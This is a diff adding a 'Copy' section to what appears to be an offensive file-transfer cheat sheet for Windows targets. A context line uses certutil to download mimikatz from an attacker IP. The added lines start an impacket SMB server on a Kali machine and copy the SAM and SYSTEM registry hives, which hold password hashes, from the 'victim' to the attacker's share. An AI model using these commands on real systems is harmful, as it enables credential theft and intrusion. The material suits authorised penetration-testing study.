@@ -50,6 +50,17 @@ certutil.exe -urlcache -split -f "http://192.168.119.194:8000/mimikatz.txt" mimi
 certutil.exe -decode mimikatz.txt mimikatz.exe
 ```
 
+#### Copy
+Upload a file from the Windows victim machine to the kali attacker machine.
+
+```
+#On the attacker kali machine, deploy a smb server
+sudo python3 /opt/impacket/examples/smbserver.py kali .
+
+#On the windows victime machine, upload the file
+copy C:\Windows\Repair\SAM \\AttackerIP\kali\
+copy C:\Windows\Repair\SYSTEM \\AttackerIP\kali\
+```
 
 # Linux Methods
 
